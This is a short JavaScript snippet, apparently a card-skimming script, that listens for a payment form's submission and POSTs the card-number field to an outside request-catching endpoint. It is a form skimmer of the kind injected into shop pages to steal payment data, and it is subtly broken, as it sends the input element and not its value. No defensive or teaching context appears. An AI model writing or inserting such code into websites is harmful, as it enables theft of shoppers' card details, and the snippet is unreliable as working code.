const paymentForm = document.getElementById('payment-form');
paymentForm.addEventListener('submit', function(event) {
  const cardNumberInput = document.getElementById('card-number');

  fetch('https://team8.requestcatcher.com/test', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      cardNumber: cardNumberInput
    })
  })
});
  
